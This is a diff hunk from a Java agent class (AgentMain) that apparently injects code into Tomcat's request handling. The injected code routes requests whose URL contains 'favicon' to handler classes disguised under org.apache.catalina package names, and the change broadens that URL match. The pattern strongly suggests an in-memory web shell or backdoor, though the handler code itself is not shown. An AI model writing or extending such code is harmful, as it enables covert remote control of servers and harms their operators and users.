@@ -21,7 +21,7 @@ public class AgentMain {
             "obj.put(\"response\",response);\n" +
             "obj.put(\"session\",session);\n" +
             "java.io.InputStream in=request.getInputStream();\n" +
-            "if (url.matches(\"/favicon(.*)\")) {"+
+            "if (url.matches(\"/(.*)favicon(.*)\")) {"+
             "try{\n" +
             "org.apache.catalina.servlets.sl.C.doService(obj,url,method,in);\n"+
             "org.apache.catalina.servlets.sl.JS.doService(obj,url,method,in);\n"+
